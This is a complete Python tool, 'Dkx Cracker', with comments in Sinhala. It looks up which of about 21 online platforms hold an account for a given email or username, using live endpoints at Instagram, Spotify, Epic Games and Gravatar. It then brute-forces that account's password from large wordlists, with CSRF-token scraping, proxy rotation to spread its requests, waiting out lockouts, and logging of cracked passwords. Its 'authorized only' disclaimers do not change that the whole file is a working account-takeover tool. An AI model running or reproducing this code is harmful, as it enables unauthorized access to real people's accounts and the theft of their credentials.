#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Dkx Cracker v1.0
================
Platform-aware account enumeration + policy-respecting password testing framework.
- ID එකක් (email / username / phone) දුන්නම platforms 21ක් හරහා account search කරනවා
- හම්බුන accounts ලිස්ට් එකෙන් crack කරන්න ඕන එක select කරන්න පුළුවන්
- ඒ platform එකේ rate-limit / lockout policy එකට ගරු කරමින් password files
  (password.txt -> onemillion.txt -> billion.txt) පිළිවෙලට test කරනවා
- Use කරන්න authorize කරපු accounts / lab environments වල පමණයි.

Usage:
    python dkx.py                          # interactive mode
    python dkx.py --fast                   # lab testing (delays reduced)
    python dkx.py --id alice --wordlists a.txt,b.txt
"""

import argparse
import hashlib
import json
import os
import random
import re
import sys
import time
from urllib.parse import quote

import requests

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG = os.path.join(BASE_DIR, "platforms.json")
RESULTS_DIR = os.path.join(BASE_DIR, "results")
TOKEN_DIR = os.path.join(BASE_DIR, "tokens")
FOUND_FILE = os.path.join(RESULTS_DIR, "found.txt")
DEFAULT_WORDLISTS = [
    os.path.join(BASE_DIR, "passwords", "password.txt"),
    os.path.join(BASE_DIR, "passwords", "onemillion.txt"),
    os.path.join(BASE_DIR, "passwords", "billion.txt"),
]

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

C = {"R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "C": "\033[96m",
     "B": "\033[94m", "M": "\033[95m", "0": "\033[0m", "BOLD": "\033[1m"}

BANNER = r"""
{0}{2}  ____  _  __     ____              _             
{0}{2} |  _ \| |/ /    |  _ \ __ _  __ _| | _____  ___ 
{0}{2} | | | | ' /_____| |_) / _` |/ _` | |/ / _ \/ __|
{0}{2} | |_| | . \_____|  _ < (_| | (_| |   <  __/\__ \
{0}{2} |____/|_|\_\    |_| \_\__,_|\__, |_|\_\___||___/
{0}{2}                             |___/               
{0}{1}      Platform-Aware Account Enumeration & Password Testing
{0}{1}      >>> For authorized targets only <<<{0}
""".format(C["0"], C["Y"], C["R"])


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def clear():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        pass


def p(msg, color=C["0"]):
    print(f"{color}{msg}{C['0']}", flush=True)


def load_platforms():
    with open(CONFIG, encoding="utf-8") as fh:
        return json.load(fh)


def detect_type(ident):
    ident = ident.strip()
    if "@" in ident:
        return "email"
    if re.fullmatch(r"\+?\d[\d\s\-()]{6,19}", ident):
        return "phone"
    return "username"


# ---------------------------------------------------------------------------
# Enumeration (account search)
# ---------------------------------------------------------------------------

def check_profile(session, cfg, ident):
    """Username/profile URL එකකින් account එක තියෙනවද බලනවා."""
    url = cfg["url"].replace("{id}", quote(ident, safe=""))
    try:
        r = session.get(url, timeout=20, allow_redirects=True,
                        headers={"User-Agent": DEFAULT_UA})
    except requests.RequestException:
        return "error"
    body = r.text.lower()
    st = r.status_code
    if st in cfg.get("blocked_status", []) or any(m in body for m in cfg.get("blocked_text", [])):
        return "blocked"
    if st in cfg.get("not_found_status", [404, 410]) or any(m in body for m in cfg.get("not_found_text", [])):
        return "not_found"
    if st == 200:
        return "found"
    return "unknown"


def check_email_api(session, kind, email):
    """Email-based account checks (public endpoints)."""
    if kind == "gravatar":
        md5 = hashlib.md5(email.lower().strip().encode()).hexdigest()
        r = session.get(f"https://en.gravatar.com/{md5}.json", timeout=20)
        return "found" if r.status_code == 200 else ("not_found" if r.status_code == 404 else "unknown")
    if kind == "epicgames":
        r = session.post("https://www.epicgames.com/id/api/email/exists",
                         json={"email": email}, timeout=20)
        try:
            return "found" if r.json().get("exists") else "not_found"
        except Exception:
            return "unknown"
    if kind == "spotify":
        r = session.get("https://spclient.wg.spotify.com/signup/public/v1/account",
                        params={"validate": "1", "email": email}, timeout=20)
        try:
            j = r.json()
            if j.get("status") == 20:
                err = str(j.get("errors", {}).get("email", "")).lower()
                return "found" if "already registered" in err else "not_found"
            return "unknown"
        except Exception:
            return "unknown"
    if kind == "instagram_check_email":
        h = {"User-Agent": DEFAULT_UA, "X-IG-App-ID": "936619743392459",
             "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/"}
        r = session.post("https://i.instagram.com/api/v1/accounts/check_email/",
                         data={"email": email}, headers=h, timeout=20)
        try:
            j = r.json()
            if j.get("available") is False:
                return "found"
            if j.get("available") is True:
                return "not_found"
            return "unknown"
        except Exception:
            return "unknown"
    return "unknown"


def scan(session, platforms, ident, itype, fast=False):
    results = []
    delay = 0.2 if fast else 1.0
    for name, cfg in platforms.items():
        enum = cfg.get("enum", {})
        status = "skip"
        if enum.get("type") == "username" and itype == "username":
            status = check_profile(session, enum, ident)
        elif enum.get("type") == "email" or cfg.get("email_api"):
            if itype == "email":
                api = cfg.get("email_api") or enum.get("type")
                status = check_email_api(session, api, ident)
            else:
                status = "n/a"
        results.append((name, cfg.get("name", name), status))
        tag = {"found": ("[+]", C["G"]), "not_found": ("[-]", C["0"]),
               "blocked": ("[!]", C["Y"]), "unknown": ("[?]", C["Y"]),
               "error": ("[x]", C["R"]), "skip": ("[~]", C["0"]),
               "n/a": ("[-]", C["0"])}[status]
        print(f"  {tag[1]}{tag[0]}{C['0']} {cfg.get('name', name):<14} -> {status}")
        time.sleep(delay)
    return results


# ---------------------------------------------------------------------------
# Rate limiter (policy-aware)
# ---------------------------------------------------------------------------

class RateLimiter:
    def __init__(self, rate, fast=False):
        self.max_per_minute = rate.get("max_per_minute", 30)
        self.d_min = 0.1 if fast else rate.get("delay_min", 1.0)
        self.d_max = 0.3 if fast else rate.get("delay_max", 3.0)
        self._win = []

    def wait(self):
        now = time.time()
        self._win = [t for t in self._win if now - t < 60.0]
        if len(self._win) >= self.max_per_minute:
            need = 60.0 - (now - self._win[0]) + random.uniform(0.5, 2.0)
            time.sleep(max(0.0, need))
        time.sleep(random.uniform(self.d_min, self.d_max))
        self._win.append(time.time())


# ---------------------------------------------------------------------------
# Token setup (CSRF / session tokens)
# ---------------------------------------------------------------------------

def setup_tokens(session, name, login):
    """tokens/<name>.json එකෙන් හෝ auto-scrape එකෙන් token එක ගන්නවා."""
    tfile = os.path.join(TOKEN_DIR, f"{name}.json")
    if os.path.exists(tfile):
        data = json.load(open(tfile, encoding="utf-8"))
        return {"headers": data.get("headers", {}), "cookies": data.get("cookies", {}),
                "token": data.get("token", "")}
    ts = login.get("token_source")
    if ts:
        try:
            r = session.get(ts["url"], timeout=20,
                            headers={"User-Agent": DEFAULT_UA})
            m = re.search(ts["regex"], r.text, re.I)
            if m:
                p("  [*] Token auto-captured from " + ts["url"], C["C"])
                return {"headers": {}, "cookies": {}, "token": m.group(1)}
        except Exception:
            pass
    p("  [!] " + login.get("token_note", "Token required"), C["Y"])
    p(f"      -> tokens/{name}.json හදන්න: "
      '{"token": "...", "headers": {}, "cookies": {}}', C["Y"])
    return None


# ---------------------------------------------------------------------------
# Cracking engine
# ---------------------------------------------------------------------------

def attempt(session, login, ident, pw, tokens, proxies):
    payload = {}
    for k, v in login.get("payload", {}).items():
        payload[k] = (str(v).replace("{ID}", ident).replace("{PASS}", pw)
                      .replace("{TOKEN}", tokens.get("token", "")))
    headers = {"User-Agent": DEFAULT_UA}
    headers.update(login.get("headers", {}))
    headers.update(tokens.get("headers", {}))
    proxy = None
    if proxies:
        proxy = {"http": random.choice(proxies), "https": random.choice(proxies)}
    try:
        if login.get("method", "POST").upper() == "POST":
            r = session.post(login["url"], data=payload, headers=headers,
                             proxies=proxy, timeout=25, allow_redirects=False)
        else:
            r = session.get(login["url"], params=payload, headers=headers,
                            proxies=proxy, timeout=25, allow_redirects=False)
    except requests.RequestException as exc:
        return None, "error:" + str(exc)[:60]
    body = r.text.lower()
    loc = (r.headers.get("Location") or "").lower()
    lock = login.get("lockout_markers", [])
    fail = login.get("failure_markers", [])
    succ = login.get("success_markers", [])
    if any(m in body for m in lock):
        return r, "lockout"
    if any(m in body for m in succ):
        return r, "success"
    if login.get("success_redirects") and r.is_redirect \
            and any(m in loc for m in login["success_redirects"]):
        return r, "success"
    if any(m in body for m in fail):
        return r, "fail"
    return r, "unknown"


def file_stats(path, rate):
    try:
        size = os.path.getsize(path)
    except OSError:
        return "?"
    if size < 5 * 1024 * 1024:
        try:
            n = sum(1 for _ in open(path, encoding="utf-8", errors="ignore"))
        except OSError:
            n = 0
    else:
        n = max(1, size // 10)  # ~10 bytes/line estimate
    per = (rate.get("delay_min", 2) + rate.get("delay_max", 5)) / 2 + 1
    mins = n * per / 60
    return f"{n} attempts | worst-case ~{mins:.0f} min"


def crack_platform(session, platforms, name, ident, wordlists, args):
    plat = platforms[name]
    login = plat.get("login")
    if not login or not plat.get("crack", True):
        p(f"\n[!] {plat['name']} - password testing supported නැහැ: "
          f"{plat.get('reason', 'no login profile')}", C["Y"])
        return None
    p(f"\n{BANNER.splitlines()[2] if False else ''}[*] Cracking: {plat['name']} "
      f"({ident})", C["B"])
    rate = login.get("rate", {})
    p(f"    Policy: max {rate.get('max_per_minute', '?')}/min, "
      f"delay {rate.get('delay_min', '?')}-{rate.get('delay_max', '?')}s, "
      f"lockout@{rate.get('lockout_after', '?')}", C["C"])

    tokens = {"headers": {}, "cookies": {}, "token": ""}
    if login.get("requires_token"):
        tokens = setup_tokens(session, name, login)
        if tokens is None:
            return None

    if args.proxy_file:
        proxies = [ln.strip() for ln in open(args.proxy_file, encoding="utf-8")
                   if ln.strip()]
    else:
        proxies = []

    limiter = RateLimiter(rate, fast=args.fast)
    attempts = 0
    lockout_waits = 0

    for fi, wl in enumerate(wordlists, 1):
        if not os.path.exists(wl):
            p(f"\n[!] File නැහැ (skip): {wl}", C["Y"])
            continue
        p(f"\n[>] File {fi}/{len(wordlists)}: {os.path.basename(wl)} "
          f"({file_stats(wl, rate)})", C["M"])
        with open(wl, encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                pw = line.strip()
                if not pw or pw.startswith("#"):
                    continue
                if args.max_attempts and attempts >= args.max_attempts:
                    p(f"\n[!] Reached --max-attempts ({args.max_attempts})", C["Y"])
                    return None
                limiter.wait()
                attempts += 1
                r, verdict = attempt(session, login, ident, pw, tokens, proxies)
                print(f"    [{attempts:>6}] {pw[:40]:<40} -> {verdict}", flush=True)
                if verdict == "success":
                    p(f"\n[+] FOUND: {ident} -> {pw}", C["G"])
                    os.makedirs(RESULTS_DIR, exist_ok=True)
                    with open(FOUND_FILE, "a", encoding="utf-8") as fh:
                        fh.write(f"{name}:{ident}:{pw}\n")
                    return pw
                if verdict == "lockout":
                    lockout_waits += 1
                    if rate.get("on_lockout") == "abort" or lockout_waits > 2:
                        p(f"\n[!] Lockout detected - aborting "
                          f"(waits={lockout_waits})", C["R"])
                        return None
                    cd = rate.get("cooldown_seconds", 300)
                    p(f"\n[*] Lockout detected - waiting {cd}s ...", C["Y"])
                    time.sleep(cd)
                if verdict.startswith("error"):
                    time.sleep(5)
    p(f"\n[-] Not found in {attempts} attempts.", C["Y"])
    return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def print_platform_list(platforms):
    items = [(k, v.get("name", k)) for k, v in platforms.items()]
    for i in range(0, len(items), 3):
        row = items[i:i + 3]
        print("   " + "     ".join(f"[{i + j + 1:>2}] {nm:<14}"
              for j, (k, nm) in enumerate(row)))
    print()


def main():
    ap = argparse.ArgumentParser(description="Dkx Cracker")
    ap.add_argument("--fast", action="store_true", help="reduce delays (lab only)")
    ap.add_argument("--wordlists", help="comma-separated override files")
    ap.add_argument("--max-attempts", type=int, default=0)
    ap.add_argument("--proxy-file", help="proxy list (one per line)")
    ap.add_argument("--id", help="skip prompts and scan this ID")
    ap.add_argument("--no-banner", action="store_true")
    args = ap.parse_args()

    platforms = load_platforms()

    if args.wordlists:
        wordlists = [os.path.abspath(x.strip()) for x in args.wordlists.split(",")]
    else:
        wordlists = DEFAULT_WORDLISTS
    if not any(os.path.exists(w) for w in wordlists):
        p("[!] Password files නැහැ. passwords/ folder එකේ "
          "password.txt, onemillion.txt, billion.txt දාන්න.", C["R"])
        sys.exit(1)

    session = requests.Session()
    session.headers["User-Agent"] = DEFAULT_UA

    if not args.no_banner:
        clear()
        print(BANNER)
        p(f"[*] Supported platforms: {len(platforms)}", C["C"])
        print_platform_list(platforms)
        p("[*] Password files: " + ", ".join(os.path.basename(w) for w in wordlists), C["C"])
        print()

    while True:
        if args.id:
            ident = args.id
            args.id = None
        else:
            try:
                ident = input(f"{C['C']}[?]{C['0']} Enter user ID (email/username/phone): ").strip()
            except (EOFError, KeyboardInterrupt):
                p("\nBye.", C["Y"])
                break
        if not ident:
            continue
        if ident.lower() in ("exit", "quit", "q"):
            break

        itype = detect_type(ident)
        clear()
        print(BANNER)
        p(f"[*] Target ID : {ident}", C["B"])
        p(f"[*] ID type   : {itype}", C["B"])
        print()

        if itype == "phone":
            p("[!] Phone-number enumeration: major platforms වල unauthenticated "
              "phone lookup API එකක් නැහැ.", C["Y"])
            p("    Email එකක් හෝ username එකක් දීලා scan කරන්න.", C["Y"])
            continue

        p(f"[*] Scanning {len(platforms)} platforms ...\n", C["C"])
        results = scan(session, platforms, ident, itype, fast=args.fast)

        found = [(k, nm, st) for k, nm, st in results if st == "found"]
        blocked = sum(1 for _, _, st in results if st in ("blocked", "unknown", "error"))
        print()
        p(f"[*] FOUND: {len(found)} account | "
          f"blocked/unknown: {blocked} | total scanned: {len(results)}", C["C"])

        if not found:
            p("[-] ඒ ID එකෙන් account එකක් හම්බුනේ නැහැ (හෝ platforms "
              "block කරලා).", C["Y"])
            continue

        print()
        p("[#] Select account to crack:", C["BOLD"])
        for i, (k, nm, st) in enumerate(found, 1):
            crackable = "OK " if platforms[k].get("crack", True) else "n/a"
            p(f"    [{i}] {nm:<16} (crack: {crackable})", C["G"] if crackable == "OK " else C["Y"])
        try:
            sel = input(f"{C['C']}[?]{C['0']} Numbers (1,2,3 / all / skip): ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break
        if sel in ("skip", ""):
            continue
        if sel == "all":
            chosen = [found[i] for i in range(len(found))]
        else:
            chosen = []
            for part in sel.split(","):
                part = part.strip()
                if part.isdigit() and 1 <= int(part) <= len(found):
                    chosen.append(found[int(part) - 1])

        for k, nm, st in chosen:
            if not platforms[k].get("crack", True):
                p(f"\n[!] {nm}: {platforms[k].get('reason', 'crack n/a')}", C["Y"])
                continue
            crack_platform(session, platforms, k, ident, wordlists, args)
            input(f"{C['C']}[?]{C['0']} Press Enter to continue ...")

        print()


if __name__ == "__main__":
    main()
